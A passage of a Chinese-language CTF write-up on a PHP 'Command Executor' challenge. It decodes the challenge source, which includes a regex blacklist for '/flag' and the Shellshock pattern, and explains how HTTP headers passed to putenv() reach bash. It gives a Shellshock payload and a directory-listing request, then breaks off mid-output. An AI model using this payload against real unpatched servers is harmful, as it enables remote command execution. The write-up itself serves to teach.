leC5waHAiPkNvbW1hbmQgRXhlY3V0b3I8L2E+CgogICAgICA8dWwgY2xhc3M9Im5hdmJhci1uYXYiPgo8P3BocCBmb3JlYWNoKCRwYWdlcyBhcyBsaXN0KCRmaWxlLCAkdGl0bGUpKTogPz4KICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayIgaHJlZj0iaW5kZXgucGhwP2Z1bmM9PD89JGZpbGU/PiI+PD89JHRpdGxlPz48L2E+CiAgICAgICAgPC9saT4KPD9waHAgZW5kZm9yZWFjaDsgPz4KICAgICAgPC91bD4KICAgIDwvbmF2PgoKICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+PD9waHAgaWYoaXNfY2FsbGFibGUoJ3JlbmRlcicpKSByZW5kZXIoKTsgZWxzZSByZW5kZXJfZGVmYXVsdCgpOyA/PjwvZGl2PgogIDwvYm9keT4KPC9odG1sPgo= 
</code></pre><p>Decode</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#78787e>&lt;?php</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff5c57>$pages</span> <span style=color:#ff6ac1>=</span> [
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>    [<span style=color:#5af78e>&#39;man&#39;</span>, <span style=color:#5af78e>&#39;Man&#39;</span>],
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    [<span style=color:#5af78e>&#39;untar&#39;</span>, <span style=color:#5af78e>&#39;Tar Tester&#39;</span>],
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    [<span style=color:#5af78e>&#39;cmd&#39;</span>, <span style=color:#5af78e>&#39;Cmd Exec&#39;</span>],
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    [<span style=color:#5af78e>&#39;ls&#39;</span>, <span style=color:#5af78e>&#39;List files&#39;</span>],
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#ff6ac1>function</span> <span style=color:#57c7ff>fuck</span>(<span style=color:#ff5c57>$msg</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    header(<span style=color:#5af78e>&#39;Content-Type: text/plain&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    <span style=color:#ff6ac1>echo</span> <span style=color:#ff5c57>$msg</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    <span style=color:#ff6ac1>exit</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#ff5c57>$black_list</span> <span style=color:#ff6ac1>=</span> [
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    <span style=color:#5af78e>&#39;\/flag&#39;</span>, <span style=color:#5af78e>&#39;\(\)\s*\{\s*:;\s*\};&#39;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#ff6ac1>function</span> <span style=color:#57c7ff>waf</span>(<span style=color:#ff5c57>$a</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>    <span style=color:#ff6ac1>global</span> <span style=color:#ff5c57>$black_list</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    <span style=color:#ff6ac1>if</span>(is_array(<span style=color:#ff5c57>$a</span>)) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>        <span style=color:#ff6ac1>foreach</span>(<span style=color:#ff5c57>$a</span> <span style=color:#ff6ac1>as</span> <span style=color:#ff5c57>$key</span> <span style=color:#ff6ac1>=&gt;</span> <span style=color:#ff5c57>$val</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>            waf(<span style=color:#ff5c57>$key</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>            waf(<span style=color:#ff5c57>$val</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>        }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>    } <span style=color:#ff6ac1>else</span> {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>        <span style=color:#ff6ac1>foreach</span>(<span style=color:#ff5c57>$black_list</span> <span style=color:#ff6ac1>as</span> <span style=color:#ff5c57>$b</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>            <span style=color:#ff6ac1>if</span>(preg_match(<span style=color:#5af78e>&#34;/</span><span style=color:#5af78e>$b</span><span style=color:#5af78e>/&#34;</span>, <span style=color:#ff5c57>$a</span>) <span style=color:#ff6ac1>===</span> <span style=color:#ff9f43>1</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>                fuck(<span style=color:#5af78e>&#34;</span><span style=color:#5af78e>$b</span><span style=color:#5af78e> detected! exit now.&#34;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>            }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>        }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>waf(<span style=color:#ff5c57>$_SERVER</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>waf(<span style=color:#ff5c57>$_GET</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>waf(<span style=color:#ff5c57>$_POST</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span><span style=color:#ff6ac1>function</span> <span style=color:#57c7ff>execute</span>(<span style=color:#ff5c57>$cmd</span>, <span style=color:#ff5c57>$shell</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#39;bash&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>    system(sprintf(<span style=color:#5af78e>&#39;%s -c %s&#39;</span>, <span style=color:#ff5c57>$shell</span>, escapeshellarg(<span style=color:#ff5c57>$cmd</span>)));
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span><span style=color:#ff6ac1>foreach</span>(<span style=color:#ff5c57>$_SERVER</span> <span style=color:#ff6ac1>as</span> <span style=color:#ff5c57>$key</span> <span style=color:#ff6ac1>=&gt;</span> <span style=color:#ff5c57>$val</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span>    <span style=color:#ff6ac1>if</span>(substr(<span style=color:#ff5c57>$key</span>, <span style=color:#ff9f43>0</span>, <span style=color:#ff9f43>5</span>) <span style=color:#ff6ac1>===</span> <span style=color:#5af78e>&#39;HTTP_&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span>        putenv(<span style=color:#5af78e>&#34;</span><span style=color:#5af78e>$key</span><span style=color:#5af78e>=</span><span style=color:#5af78e>$val</span><span style=color:#5af78e>&#34;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span><span style=color:#ff5c57>$page</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span><span style=color:#ff6ac1>if</span>(isset(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;func&#39;</span>])) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span>    <span style=color:#ff5c57>$page</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;func&#39;</span>];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span><span>    <span style=color:#ff6ac1>if</span>(strstr(<span style=color:#ff5c57>$page</span>, <span style=color:#5af78e>&#39;..&#39;</span>) <span style=color:#ff6ac1>!==</span> <span style=color:#ff6ac1>false</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span>        <span style=color:#ff5c57>$page</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#39;&#39;</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span><span><span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$page</span> <span style=color:#ff6ac1>&amp;&amp;</span> strlen(<span style=color:#ff5c57>$page</span>) <span style=color:#ff6ac1>&gt;</span> <span style=color:#ff9f43>0</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span><span>    <span style=color:#ff6ac1>try</span> {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span><span>        <span style=color:#ff6ac1>include</span>(<span style=color:#5af78e>&#34;</span><span style=color:#5af78e>$page</span><span style=color:#5af78e>.php&#34;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span><span>    } <span style=color:#ff6ac1>catch</span> (Exception <span style=color:#ff5c57>$e</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65</span><span><span style=color:#ff6ac1>function</span> <span style=color:#57c7ff>render_default</span>() { <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66</span><span>&lt;<span style=color:#ff6ac1>p</span>&gt;Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.&lt;/<span style=color:#ff6ac1>p</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68</span><span>&lt;<span style=color:#ff6ac1>img</span> <span style=color:#57c7ff>src</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;windows-run.jpg&#34;</span> <span style=color:#57c7ff>alt</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;command executor&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69</span><span><span style=color:#78787e>&lt;?php</span> }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70</span><span><span style=color:#78787e>?&gt;&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71</span><span>&lt;<span style=color:#ff6ac1>html</span> <span style=color:#57c7ff>lang</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72</span><span>  &lt;<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73</span><span>    &lt;<span style=color:#ff6ac1>meta</span> <span style=color:#57c7ff>charset</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74</span><span>    &lt;<span style=color:#ff6ac1>title</span>&gt;Command Executor&lt;/<span style=color:#ff6ac1>title</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75</span><span>    &lt;<span style=color:#ff6ac1>link</span> <span style=color:#57c7ff>rel</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;stylesheet&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;bootstrap/css/bootstrap.min.css&#34;</span> <span style=color:#57c7ff>media</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;all&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76</span><span>    &lt;<span style=color:#ff6ac1>link</span> <span style=color:#57c7ff>rel</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;stylesheet&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;comic-neue/font.css&#34;</span> <span style=color:#57c7ff>media</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;all&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77</span><span>    &lt;<span style=color:#ff6ac1>style</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78</span><span>      <span style=color:#ff6ac1>nav</span> { <span style=color:#ff6ac1>margin-bottom</span>: <span style=color:#ff9f43>1</span><span style=color:#9aedfe>rem</span>; }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79</span><span>      <span style=color:#ff6ac1>img</span> { <span style=color:#ff6ac1>max-width</span>: <span style=color:#ff9f43>100</span><span style=color:#9aedfe>%</span>; }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">80</span><span>    &lt;/<span style=color:#ff6ac1>style</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">81</span><span>  &lt;/<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">82</span><span>  &lt;<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">83</span><span>    &lt;<span style=color:#ff6ac1>nav</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar navbar-expand-lg navbar-dark bg-dark d-flex&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">84</span><span>      &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-brand&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;index.php&#34;</span>&gt;Command Executor&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">85</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">86</span><span>      &lt;<span style=color:#ff6ac1>ul</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-nav&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">87</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>foreach</span>(<span style=color:#ff5c57>$pages</span> <span style=color:#ff6ac1>as</span> <span style=color:#ff6ac1>list</span>(<span style=color:#ff5c57>$file</span>, <span style=color:#ff5c57>$title</span>))<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">88</span><span>        &lt;<span style=color:#ff6ac1>li</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;nav-item&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">89</span><span>          &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;nav-link&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;index.php?func=</span><span style=color:#78787e>&lt;?</span><span style=color:#ff6ac1>=</span><span style=color:#ff5c57>$file</span><span style=color:#78787e>?&gt;</span><span style=color:#5af78e>&#34;</span>&gt;<span style=color:#78787e>&lt;?</span><span style=color:#ff6ac1>=</span><span style=color:#ff5c57>$title</span><span style=color:#78787e>?&gt;</span>&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">90</span><span>        &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">91</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>endforeach</span>; <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">92</span><span>      &lt;/<span style=color:#ff6ac1>ul</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">93</span><span>    &lt;/<span style=color:#ff6ac1>nav</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">94</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">95</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;<span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>if</span>(is_callable(<span style=color:#5af78e>&#39;render&#39;</span>)) render(); <span style=color:#ff6ac1>else</span> render_default(); <span style=color:#78787e>?&gt;</span>&lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">96</span><span>  &lt;/<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">97</span><span>&lt;/<span style=color:#ff6ac1>html</span>&gt;
</span></span></code></pre></div><p>可以在上面看到一段 code：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#ff6ac1>foreach</span>(<span style=color:#ff5c57>$_SERVER</span> <span style=color:#ff6ac1>as</span> <span style=color:#ff5c57>$key</span> <span style=color:#ff6ac1>=&gt;</span> <span style=color:#ff5c57>$val</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>    <span style=color:#ff6ac1>if</span>(substr(<span style=color:#ff5c57>$key</span>, <span style=color:#ff9f43>0</span>, <span style=color:#ff9f43>5</span>) <span style=color:#ff6ac1>===</span> <span style=color:#5af78e>&#39;HTTP_&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span>        putenv(<span style=color:#5af78e>&#34;</span><span style=color:#5af78e>$key</span><span style=color:#5af78e>=</span><span style=color:#5af78e>$val</span><span style=color:#5af78e>&#34;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5</span><span>}
</span></span></code></pre></div><p>會將所有<code>$_SERVER</code>中<code>$key</code>為<code>HTTP_</code>開頭的值都放進<code>putenv()</code>這個 function。<br>(如果你不知道 PHP 中的<code>$_SERVER</code>是什麼，建議先了解再繼續往下看)</p><p>我們是不是可以利用這點，想辦法塞入符合它條件的<code>$_SERVER</code>中的值，使其通過<code>putenv()</code>。</p><p>這題其實是在講<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6271" target=_blank><code>CVE-2014-6271</code></a>這個嚴重的漏洞，又稱「<code>Shellshock</code>」。</p><hr><p>至於 payload 的解釋這邊不贅述，網路上已經充斥許多關於講解<code>CVE-2014-6271</code>的文章可供參考。</p><p>可以透過「<code>() { :; }; echo "injected"</code>」來使<code>bash</code>執行到<code>echo "injected"</code>，當然也可以換成其他更有攻擊性的語法。</p><p>透過<code>index.php?func=ls&amp;file=/</code>可以看到根目錄底下的檔案：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>total <span style=color:#ff9f43>88</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>drwxr-xr-x   <span style=color:#ff9f43>2</span> root root <span style=color:#ff9f43>4096</span> Jan <span style=color:#ff9f43>19</span>  <span style=color:#ff9f43>2018</span> bin
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>drwxr-xr-x   <span style=color:#ff9f43>2</span> root root <span style=color:#ff9f43>4096</span> Apr <span style=color:#ff9f43>12</span>  <span style=color:#ff9f43>2016</span> boot
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>drwxr-xr-x   <span style=color:#ff9f43>5</span> root root  <span style=color:#ff9f43>340</span> Jan  <span style=color:#ff9f43>5</span> 14:34 dev
